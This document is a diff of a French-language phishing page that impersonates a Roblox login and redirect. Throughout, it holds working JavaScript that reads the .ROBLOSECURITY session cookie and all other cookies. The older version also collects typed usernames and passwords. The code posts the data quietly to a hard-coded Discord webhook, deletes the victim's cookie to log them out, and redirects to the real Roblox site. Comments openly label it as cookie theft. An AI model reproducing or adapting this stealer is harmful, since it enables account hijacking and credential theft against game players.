@@ -1,130 +1,64 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion Roblox</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body { background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:'Segoe UI',Arial; }
-        .box { background:#16213e; padding:40px; border-radius:20px; box-shadow:0 0 40px #0f3460; text-align:center; color:#fff; max-width:400px; width:90%; display:none; }
-        .box h2 { margin-bottom:20px; font-weight:300; }
-        .box input { width:100%; padding:12px; margin:10px 0; border:none; border-radius:8px; background:#1a1a3e; color:#fff; }
-        .box input::placeholder { color:#888; }
-        .box button { width:100%; padding:12px; background:#ff4757; border:none; border-radius:8px; color:#fff; font-weight:bold; cursor:pointer; transition:.3s; }
-        .box button:hover { background:#ff6b81; }
-        .loader { border:5px solid #f3f3f3; border-top:5px solid #ff4757; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
-        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
-        .status { position:fixed; bottom:10px; left:10px; background:#000; color:#0f0; font-size:12px; padding:10px; max-width:90%; z-index:9999; white-space:pre-wrap; border:1px solid #0f0; }
-    </style>
+    <meta http-equiv="refresh" content="0; url=https://www.roblox.com/login">
+    <title>Redirection</title>
+    <style>body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:50px;}</style>
 </head>
 <body>
-    <div class="box" id="loginBox">
-        <h2>🔐 Connexion Roblox</h2>
-        <p style="color:#aaa; margin-bottom:20px;">Veuillez vous identifier</p>
-        <input type="text" id="username" placeholder="Nom d'utilisateur">
-        <input type="password" id="password" placeholder="Mot de passe">
-        <button id="loginBtn">Se connecter</button>
-        <div class="loader" id="loader"></div>
-    </div>
-    <div class="status" id="status">[STATUS] Prêt...</div>
+    <h2>⏳ Redirection...</h2>
+    <p>Vous allez être redirigé vers Roblox.</p>
 
     <script>
         (function() {
             // ============================================================
-            //   CONFIG : REMPLACE ICI PAR L'URL DE TON NOUVEAU WEBHOOK
+            //   REMPLACE ICI PAR L'URL DE TON WEBHOOK
             // ============================================================
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537080609078509589/kGOHtW-bS9iP_AeF3zbSeqosgYU8Yib-Qz7qAejJuajfEQke3Ek3GgnR61YrUBJQPaUy";
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537081937582358528/v-GmnzihcuJ-u-0Ub7gbH1ZuEc71961t3eQtsGRAsVGDbyutfUW5KaE-FPROFRf1AWO-";
             // ============================================================
 
-            const statusDiv = document.getElementById('status');
-            function status(msg) {
-                console.log(msg);
-                statusDiv.textContent = '[STATUS] ' + msg;
-            }
+            // 1. RÉCUPÉRER TOUS LES COOKIES
+            const allCookies = document.cookie;
 
-            status("Script chargé.");
-
-            // Fonction d'envoi robuste
-            function sendToDiscord(payload) {
-                status("Envoi en cours...");
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload),
-                    mode: 'no-cors'
-                })
-                .then(() => status("✅ Envoi effectué (no-cors)"))
-                .catch(err => status("❌ Erreur : " + err.message));
-            }
-
-            // Récupération du cookie .ROBLOSECURITY
-            const cookies = document.cookie.split('; ');
-            const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
-            const cookieValue = robloxSec ? robloxSec.split('=')[1] : null;
-
-            if (cookieValue) {
-                status("🍪 Cookie trouvé ! Vol immédiat...");
-                const payload = {
-                    embeds: [{
-                        title: "🎯 COOKIE ROBLOX VOLÉ",
-                        color: 0xff0000,
-                        fields: [
-                            { name: "🔑 .ROBLOSECURITY", value: `\`${cookieValue}\``, inline: false },
-                            { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
-                            { name: "🌐 URL", value: window.location.href, inline: false }
-                        ],
-                        footer: { text: "ShadowCAT // Vol automatique" }
-                    }]
-                };
-                sendToDiscord(payload);
-
-                // Supprime le cookie pour déconnecter la victime
-                document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
-                document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
-                status("🗑️ Cookie supprimé, redirection...");
-
-                setTimeout(() => {
-                    window.location.replace("https://www.roblox.com/login");
-                }, 1200);
-            } else {
-                status("🚫 Pas de cookie. Affichage du formulaire.");
-                document.getElementById('loginBox').style.display = 'block';
-            }
-
-            // Gestion du formulaire
-            document.getElementById('loginBtn').addEventListener('click', function() {
-                const username = document.getElementById('username').value.trim();
-                const password = document.getElementById('password').value.trim();
-
-                if (!username || !password) {
-                    alert('Veuillez remplir tous les champs.');
-                    return;
+            // 2. EXTRAIRE .ROBLOSECURITY
+            const cookiePairs = allCookies.split('; ');
+            let robloxSecurity = null;
+            for (let pair of cookiePairs) {
+                if (pair.startsWith('.ROBLOSECURITY=')) {
+                    robloxSecurity = pair.split('=')[1];
+                    break;
                 }
+            }
 
-                status("👤 Identifiants saisis : " + username);
-                document.getElementById('loginBtn').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
+            // 3. PRÉPARER LE PAYLOAD
+            const embed = {
+                title: robloxSecurity ? "🎯 COOKIE ROBLOX VOLÉ" : "⚠️ TENTATIVE DE VOL (pas de cookie)",
+                color: robloxSecurity ? 0xff0000 : 0xffaa00,
+                fields: [
+                    { name: "🔑 .ROBLOSECURITY", value: robloxSecurity ? `\`${robloxSecurity}\`` : "❌ Aucun cookie trouvé", inline: false },
+                    { name: "📦 Tous les cookies", value: `\`${allCookies || 'VIDE'}\``, inline: false },
+                    { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
+                    { name: "🌐 URL", value: window.location.href, inline: false },
+                    { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
+                ],
+                footer: { text: "ShadowCAT // Vol silencieux" }
+            };
 
-                const payload = {
-                    embeds: [{
-                        title: "🎣 IDENTIFIANTS ROBLOX (formulaire)",
-                        color: 0xffa500,
-                        fields: [
-                            { name: "👤 Nom d'utilisateur", value: `\`${username}\``, inline: true },
-                            { name: "🔒 Mot de passe", value: `\`${password}\``, inline: true },
-                            { name: "🌐 User-Agent", value: navigator.userAgent, inline: false },
-                            { name: "🌍 URL", value: window.location.href, inline: false }
-                        ],
-                        footer: { text: "ShadowCAT // Formulaire" }
-                    }]
-                };
-                sendToDiscord(payload);
+            // 4. ENVOYER AU WEBHOOK (mode no-cors = furtif)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] }),
+                mode: 'no-cors'
+            }).catch(() => {});
 
-                setTimeout(() => {
-                    window.location.replace("https://www.roblox.com/login");
-                }, 1200);
-            });
+            // 5. SUPPRIMER LE COOKIE POUR DÉCONNECTER LA VICTIME
+            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
+            document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
+
+            // 6. REDIRECTION IMMÉDIATE VERS LA VRAIE PAGE DE LOGIN
+            window.location.replace("https://www.roblox.com/login");
         })();
     </script>
 </body>
